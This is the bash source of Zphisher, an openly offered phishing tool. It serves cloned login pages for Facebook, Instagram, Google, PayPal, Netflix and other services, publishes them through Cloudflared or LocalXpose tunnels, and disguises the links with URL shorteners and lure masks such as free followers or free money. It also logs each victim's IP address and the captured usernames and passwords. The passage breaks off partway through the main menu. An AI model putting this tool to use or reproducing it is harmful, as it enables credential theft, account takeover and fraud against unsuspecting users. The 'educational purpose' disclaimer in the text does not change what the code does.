#!/bin/bash

##   Zphisher 	: 	Automated Phishing Tool
##   Author 	: 	TAHMID RAYAT 
##   Version 	: 	2.3.5
##   Github 	: 	https://github.com/htr-tech/zphisher


##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
##

##   THANKS TO :
##   1RaY-1 - https://github.com/1RaY-1
##   Aditya Shakya - https://github.com/adi1090x
##   Ali Milani Amin - https://github.com/AliMilani
##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##   Moises Tapia - https://github.com/MoisesTapia
##   Mr.Derek - https://github.com/E343IO
##   Mustakim Ahmed - https://github.com/bdhackers009
##   TheLinuxChoice - https://twitter.com/linux_choice


__version__="2.3.5"

## DEFAULT HOST & PORT
HOST='0.0.0.0'
PORT='80' 

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	check_PID="php cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

# Check for a newer release
check_update(){
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"

	if [[ $new_version != $__version__ ]]; then
		echo -ne "${ORANGE}update found\n"${WHITE}
		sleep 2
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
		pushd "$HOME" > /dev/null 2>&1
		curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"

		if [[ -e ".zphisher.tar.gz" ]]; then
			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
			rm -f .zphisher.tar.gz
			popd > /dev/null 2>&1
			{ sleep 3; clear; banner_small; }
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
			{ reset_color ; exit 1; }
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
			{ reset_color; exit 1; }
		fi
	else
		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
	fi
}

## Check Internet Status
check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
	cat <<- EOF
		${ORANGE}
		${ORANGE} ______      _     _     _               
		${ORANGE}|___  /     | |   (_)   | |              
		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
		${ORANGE}      | |                                
		${ORANGE}      |_|                ${RED}Version : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}Warning:${RESETBG}
		${CYAN}  This Tool is made for educational purpose 
		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
		  any misuse of this toolkit ${RED}!${WHITE}
		
		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
		  Yisus7u7

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Choose custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
	fi
}

## Setup website and start php server
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start Cloudflared
start_cloudflared() { 
	rm .cld.log > /dev/null 2>&1 &
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	sleep 8
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	custom_url "$cldflr_url"
	capture_data
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose (Again...)
start_loclx() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	sleep 12
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
	custom_url "$loclx_url"
	capture_data
}

## Start localhost
start_localhost() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		3 | 03)
			start_loclx;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Custom Mask URL
custom_mask() {
	{ sleep .5; clear; banner_small; echo; }
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
	echo
	if [[ ${mask_op,,} == "y" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
			mask=$mask_url
			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
		fi
	fi
}

## URL Shortner
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [[ "$1" == *"shrtco.de"* ]]; then
		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
		processed_url=${short#http*//}
	fi
}

custom_url() {
	url=${1#http*//}
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
		if [[ $(site_stat $isgd) == 2* ]]; then
			shorten $isgd "$url"
		elif [[ $(site_stat $shortcode) == 2* ]]; then
			shorten $shortcode "$url"
		else
			shorten $tinyurl "$url"
		fi

		url="https://$url"
		masked_url="$mask@$processed_url"
		processed_url="https://$processed_url"
	else
		# echo "[!] No url provided / Regex Not Matched"
		url="Unable to generate links. Try after turning on hotspot"
		processed_url="Unable to Short URL"
	fi

	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Vk
site_vk() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="vk"
			mask='https://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 

		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
